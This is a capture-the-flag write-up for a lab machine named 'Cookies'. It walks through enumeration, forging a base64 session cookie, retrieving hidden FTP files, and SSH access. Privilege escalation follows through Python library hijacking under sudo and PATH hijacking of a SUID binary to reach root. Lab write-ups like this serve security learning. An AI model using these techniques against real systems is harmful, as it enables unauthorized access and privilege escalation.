# Cookies ? Writeup

## Enumeration
---
### *Nmap scan*:
```sh
nmap -sV -sC -p- cookie.thm
```
### *Web enumeration*:
```sh
ffuf -w [wordlist] -u http://cookie.thm/FUZZ
```

In robots.txt file we have an user : CookieMonster

## Exploitation
----
### *Web* :


We can see that the cookie is encoded in base64, When we decode it we see that it's user + number. So we encode "CookieMonster" and we replace the cookie with this one. We refresh the page and we have the credentials for the ftp server.

### *FTP* :

We connect to the ftp server :
```sh
get .important.txt
cd files/
get .secret.txt
 ```

### *Web 2*:

We display the file's content and we can see a file path encoded in base64
```sh
echo [content] | base64 -d 
```
We got cookie_gift that is a folder in the web server. When we browse to cookie.thm/cookie_gift we get the ssh password for david

## Access
----

### *SSH*:


We connect to the ssh server : 
```sh
ssh david@cookie.thm 
```
Then we enter the password found previously.

### *Privilege Escalation*:

In the /home/david/ directory, there is a file called .secure, in which we learn that there is a db hidden somewhere in the system. So we will try to find a db :
```sh
find / -type f -name "*.db" 2>/dev/null
```
One file called .client.db seems to be interesting, so we connect to it using sqlite3. In the table : clients3 there are two password, we take the second one. We can now escalate to cookiemonster:
```sh
su cookiemonster
/bin/bash -i
```

### *Privilege Escalation 2*:
We go to /home/cookiemonster and we see a .py file. In this python file, at the beginning, there is an import from a path. When we import a python librairy, it's executed from the top, to the bottom. So we can create a library that spawn a shell. We can execute that script as cookiemaster.

Now we create a folder named lib with the library inside of it :
```sh
mkdir lib
cd lib
touch module.py
nano module.py
inside nano :
        import pty
        pty.spawn('/bin/bash')

sudo -u cookiemaster /usr/bin/python3 /home/cookiemonster/script.py 0
```

We are logged as cookiemaster now !

## Road to Root
---
We move to /home/cookiemaster and we see a file called .cookiejar, a suid binary. Now we can use the PATH exploitation to gain a shell. When we run .cookiejar it displays "O_o" so it may execute another binary to display "O_o". We can deduce that it can be cat (if it's stored in a file) or echo. So:
```sh
echo "/bin/bash -i" > echo
chmod +x echo

echo "/bin/bash -i" > cat
chmod +x cat
```
We display the environnement PATH variable to be able to restore it after the exploitation and we replace it with our one:
```sh
echo $PATH
export PATH="."
```
We run cookiejar and restore the path :
```sh
export PATH=[path saved before]
```
We are now root and can display the content of /root/root.txt !

That's it, we have the root flag !

---
----

### In Video : https://www.youtube.com/watch?v=ktj1d2U2iZE&ab_channel=Ph3nX
----
---